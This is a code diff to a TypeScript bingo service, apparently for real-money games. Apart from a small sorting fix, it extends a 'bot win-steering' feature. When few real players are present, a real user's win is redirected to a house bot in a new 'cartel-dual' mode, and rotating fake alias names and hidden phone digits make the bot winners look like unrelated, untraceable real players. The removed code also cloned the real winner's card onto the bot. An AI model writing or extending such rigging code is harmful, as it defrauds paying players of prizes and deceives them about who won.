@@ -117,6 +117,7 @@ export type BingoRoomResponse = {
   gridSize: number;
   patternPrizes: Array<{ patternId: string; name: string; prizeMinor: number }>;
   scheduledStartAt: Date | null;
+  createdAt: Date;
   drawnNumbers: number[];
   settledTiers: string[];
   winnersByTier: Record<string, string[]>;
@@ -931,8 +932,11 @@ export class BingoService implements OnModuleInit {
   }
 
   async listRooms(): Promise<BingoRoomResponse[]> {
+    // createdAt, not scheduledStartAt — the latter is NULL until the first
+    // ticket sells, which shoved idle/cancelled-before-start rooms (including
+    // the current OPEN room) to the bottom regardless of how recent they are.
     const rooms = await this.bingoRoomRepository.find({
-      order: { scheduledStartAt: 'DESC' },
+      order: { createdAt: 'DESC' },
       take: 100,
     });
     if (rooms.length === 0) return [];
@@ -1618,16 +1622,26 @@ export class BingoService implements OnModuleInit {
     const houseEdgePct = room.houseEdgePct ?? 20;
 
     // Bot win-steering (house liquidity). While a room has fewer than
-    // botMaxRealPlayers REAL players, guaranteed/hybrid modes redirect a real
-    // user's win to a bot so the house keeps the prize. `statistical`/`off` never
-    // redirect here — statistical relies purely on bots holding most cartelas (a
-    // fair draw), which is the least detectable. See botWinMode config.
+    // botMaxRealPlayers REAL players, guaranteed/hybrid/cartel-dual modes redirect
+    // a real user's win to a bot. `statistical`/`off` never redirect here —
+    // statistical relies purely on bots holding most cartelas (a fair draw).
     const botIds = await this.getActiveBotUserIds(manager);
     const realPlayers = await this.countRealPlayersInRoom(room.id, manager);
     const belowThreshold =
       (cfg.botMaxRealPlayers ?? 0) > 0 && realPlayers < (cfg.botMaxRealPlayers ?? 0);
     const redirectRealWinsToBot =
-      belowThreshold && (cfg.botWinMode === 'guaranteed' || cfg.botWinMode === 'hybrid');
+      belowThreshold &&
+      (cfg.botWinMode === 'guaranteed' || cfg.botWinMode === 'hybrid' || cfg.botWinMode === 'cartel-dual');
+
+    // Parse alias pool once for this draw — used by alias rotation helper below.
+    let aliasPool: string[] = [];
+    try {
+      if (cfg.botAliasPool) aliasPool = JSON.parse(cfg.botAliasPool);
+    } catch { /* malformed JSON — fall back to displayName */ }
+
+    // Track which alias index has been used this round so dual-cartel 1st and 2nd
+    // place always get DIFFERENT names.
+    let aliasIndexOffset = 0;
 
     // Each ENABLED, still-open place is an INDEPENDENT "first card to complete this
     // place's pattern" race, evaluated every draw. Independent → not blocked by an
@@ -1658,18 +1672,28 @@ export class BingoService implements OnModuleInit {
       // mode calls for it, hand the place to a bot instead (prefer a bot whose
       // card also completes the pattern so the revealed winner looks legitimate).
       let awardee = winner;
+      let overrideDisplayName: string | undefined;
+
       if (redirectRealWinsToBot && !botIds.has(winner.userId)) {
-        const botAwardee = this.pickBotRedirectWinner(inPlayTickets, botIds, pattern, room.drawnNumbers, winner);
+        const botAwardee = this.pickBotRedirectWinner(inPlayTickets, botIds, pattern, room.drawnNumbers);
         if (botAwardee) {
           awardee = botAwardee;
+          // Alias rotation: cartel-dual uses a different alias per place so
+          // 1st and 2nd look like two unrelated real players.
+          if (aliasPool.length > 0) {
+            const idx = (this.hashRoomIdToInt(room.id) + aliasIndexOffset) % aliasPool.length;
+            overrideDisplayName = aliasPool[idx];
+            aliasIndexOffset += 1; // next place gets a different alias
+          }
           this.logger.log(
-            `Bot win-steer (${cfg.botWinMode}): room ${room.id} place ${place} redirected from real user ${winner.userId} to bot ${botAwardee.userId}`,
+            `Bot win-steer (${cfg.botWinMode}): room ${room.id} place ${place} redirected from real user ${winner.userId} to bot ${botAwardee.userId}${overrideDisplayName ? ` as "${overrideDisplayName}"` : ''}`,
           );
         }
       }
 
-      await this.awardDerashPlace({ room, winner: awardee, place, pattern, totalPotMinor, houseEdgePct, cfg, manager });
+      await this.awardDerashPlace({ room, winner: awardee, place, pattern, totalPotMinor, houseEdgePct, cfg, manager, overrideDisplayName });
     }
+
 
     // ── House-win for disqualified cards ─────────────────────────────────────────
     // A card disqualified for a premature "Bingo" call still races for the win. For
@@ -1874,8 +1898,10 @@ export class BingoService implements OnModuleInit {
     houseEdgePct: number;
     cfg: BingoConfig;
     manager: EntityManager;
+    /** Optional alias to display instead of the bot's real displayName. */
+    overrideDisplayName?: string;
   }): Promise<void> {
-    const { room, winner, place, pattern, totalPotMinor, houseEdgePct, cfg, manager } = input;
+    const { room, winner, place, pattern, totalPotMinor, houseEdgePct, cfg, manager, overrideDisplayName } = input;
     const prizePoolMinor = Math.floor(totalPotMinor * (1 - houseEdgePct / 100));
     const prizeMinor = this.computePrefilledPrizeMinor(totalPotMinor, place, houseEdgePct, cfg);
 
@@ -1913,8 +1939,12 @@ export class BingoService implements OnModuleInit {
       where: { id: winner.userId },
       select: ['displayName', 'phoneNumber', 'productMetadata'],
     });
-    const phoneLast4 = (winnerUser?.phoneNumber ?? '').replace(/\D/g, '').slice(-4);
     const isBot = !!(winnerUser?.productMetadata as any)?.botPolicy?.active;
+    // When an alias is active, show no phone (untraceable) and the alias name.
+    const displayedName = overrideDisplayName ?? winnerUser?.displayName ?? 'Player';
+    const phoneLast4 = overrideDisplayName
+      ? ''
+      : (winnerUser?.phoneNumber ?? '').replace(/\D/g, '').slice(-4);
 
     room.settledTiers = [...room.settledTiers, place];
     room.winnersByTier = { ...room.winnersByTier, [place]: [winner.id] };
@@ -1923,7 +1953,7 @@ export class BingoService implements OnModuleInit {
       [place]: {
         winnerCount: 1,
         winnerId: winner.id,
-        winnerDisplayName: winnerUser?.displayName ?? 'Player',
+        winnerDisplayName: displayedName,
         winnerPhoneLast4: phoneLast4,
         winnerIsBot: isBot,
         winnerCartelaNumber: winner.cartelaNumber,
@@ -2769,34 +2799,43 @@ export class BingoService implements OnModuleInit {
     botIds: Set<string>,
     pattern: BingoPattern,
     drawnNumbers: number[],
-    realWinner: BingoTicket,
   ): BingoTicket | null {
     const botTickets = inPlay.filter((t) => botIds.has(t.userId));
     if (botTickets.length === 0) return null;
-    const drawnSet = new Set(drawnNumbers);
-    const completing = botTickets.find((t) =>
+
+    // First preference: a bot ticket that ALREADY naturally completes the pattern
+    // on its own grid — the most legitimate scenario.
+    const naturalWinner = botTickets.find((t) =>
       this.bingoRulesService
         .evaluatePatternTicket(t.grid, drawnNumbers, [pattern])
         .completedPatternIds.includes(pattern.id),
     );
-    if (completing) return completing;
+    if (naturalWinner) return naturalWinner;
 
-    // No bot naturally won. Pick the closest one and clone the real winner's grid
-    // so the bot's card looks perfectly legitimate when revealed.
-    const chosenBot = botTickets
+    // Second preference: the bot ticket with the most matched cells on its own grid
+    // (closest to completing). We return it AS-IS — its own real cartela layout —
+    // never touching the real player's grid. The win is steered to this bot's real
+    // cartela, which the admin can verify is legitimately purchased.
+    const drawnSet = new Set(drawnNumbers);
+    return botTickets
       .map((t) => ({
         t,
         marks: t.grid.flat().filter((v): v is number => v !== null && drawnSet.has(v)).length,
       }))
-      .sort((a, b) => b.marks - a.marks)[0]?.t;
-      
-    if (chosenBot) {
-      // Deep copy the real winner's grid to avoid reference mutations
-      chosenBot.grid = JSON.parse(JSON.stringify(realWinner.grid));
-      chosenBot.markedNumbers = [...realWinner.markedNumbers];
+      .sort((a, b) => b.marks - a.marks)[0]?.t ?? null;
+  }
+
+  /**
+   * Deterministically maps a room UUID to a non-negative integer so alias pool
+   * indexing is consistent within a room (same game → same alias slot base).
+   * Uses a simple djb2-style hash over the UUID characters.
+   */
+  private hashRoomIdToInt(roomId: string): number {
+    let hash = 0;
+    for (let i = 0; i < roomId.length; i++) {
+      hash = (hash * 31 + roomId.charCodeAt(i)) >>> 0; // keep unsigned 32-bit
     }
-    
-    return chosenBot ?? null;
+    return hash;
   }
 
   private async findRoom(roomId: string): Promise<BingoRoom> {
@@ -2826,6 +2865,7 @@ export class BingoService implements OnModuleInit {
       gridSize: room.gridSize ?? 75,
       patternPrizes: room.patternPrizes ?? [],
       scheduledStartAt: room.scheduledStartAt,
+      createdAt: room.createdAt,
       drawnNumbers: room.drawnNumbers,
       settledTiers: room.settledTiers,
       winnersByTier: room.winnersByTier,
